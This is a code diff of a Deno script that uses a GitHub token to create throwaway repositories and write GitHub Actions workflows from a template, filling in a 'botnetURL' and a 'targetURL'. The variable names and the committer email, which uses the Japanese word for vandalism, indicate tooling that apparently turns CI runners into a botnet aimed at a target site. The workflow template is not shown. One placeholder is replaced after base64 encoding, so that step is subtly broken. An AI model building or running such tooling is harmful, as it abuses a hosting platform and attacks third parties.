@@ -1,12 +1,11 @@
-import { Octokit, App } from "https://esm.sh/octokit?dts";
+import { Octokit } from "https://esm.sh/octokit?dts";
 import "https://deno.land/x/dotenv@v3.2.0/load.ts";
 
-const { TOKEN } = Deno.env.toObject();
+const { TOKEN, botnetURL, targetURL } = Deno.env.toObject();
 
 const octokit = new Octokit({
   auth: TOKEN,
 });
-const myName = await octokit.rest.users.getAuthenticated();
 
 const botnet = await octokit.rest.repos.createForAuthenticatedUser({
   name: "test-" + Date.now().toString(36),
@@ -20,27 +19,32 @@ const afterOwner = botnet.data.owner.login;
 const afterRepo = botnet.data.name;
 
 const array = Array.from({ length: 2 }).fill(0).map(async (_v, i) => {
-    console.log("[!] Create reg-" + i);
-    const workflow = await octokit.rest.repos.createOrUpdateFileContents({
-        owner: afterOwner,
-        repo: afterRepo,
-        path: ".github/workflows/entry" + i + ".yml",
-        message: "setup",
-        content: btoa(await Deno.readTextFile("./objects/index.yml")),
-        committer: {
-          name: `SetupBot`,
-          email: "amex@荒らし.com",
-        },
-        author: {
-          name: "SetupBot",
-          email: "amex@荒らし.com",
-        },
-    });
+  console.log("[!] Create reg-" + i);
+  const workflow = await octokit.rest.repos.createOrUpdateFileContents({
+    owner: afterOwner,
+    repo: afterRepo,
+    path: ".github/workflows/entry" + i + ".yml",
+    message: "setup",
+    content: btoa(
+      (await Deno.readTextFile("./objects/index.yml")).replace(
+        /{{base}}/g,
+        "https://github.com/" + botnetURL,
+      ),
+    ).replace(/{{url}}/g, targetURL),
+    committer: {
+      name: `SetupBot`,
+      email: "amex@荒らし.com",
+    },
+    author: {
+      name: "SetupBot",
+      email: "amex@荒らし.com",
+    },
+  });
 
-    await new Promise((resolve) => setTimeout(resolve, 100));
+  await new Promise((resolve) => setTimeout(resolve, 100));
 
-    return workflow.data.content?.path
-})
+  return workflow.data.content?.path;
+});
 
 console.log("[!] Writed Action");
 
@@ -49,5 +53,5 @@ console.log("[!] Start setup");
 // run workflow
 
 array.forEach(async (_v, i) => {
-    console.log("[!] Run " + await _v);
-})
+  console.log("[!] Run " + await _v);
+});
